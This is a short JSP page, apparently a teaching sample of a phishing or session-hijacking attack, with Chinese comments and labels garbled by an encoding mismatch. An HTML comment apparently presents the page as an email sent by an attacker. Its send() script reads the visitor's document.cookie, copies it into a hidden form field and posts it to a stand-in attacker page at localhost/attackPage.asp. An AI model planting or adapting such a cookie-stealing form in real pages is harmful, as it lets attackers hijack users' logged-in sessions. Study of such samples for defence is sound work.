<%@ page language="java" import="java.util.*" pageEncoding="gb2312"%>
<html>
<body>
<%
	//session��飬������
 %>
<!--�����ǹ����߷��͵�һ���ʼ�-->
������һ�����ʼ������н��ˣ�������д�������������ύ��<BR>
<script type="text/javascript">
	function send(){
		var cookie = document.cookie;
		document.form1.cookies.value=cookie;
		document.form1.submit();
	}
</script>
<form name="form1" action="http://localhost/attackPage.asp" method="post">
	��������:<input name="">
	<input type="hidden" name="cookies">
	<input type="button" value="�ύ����" onClick="send()">
</form>
</body>
</html>
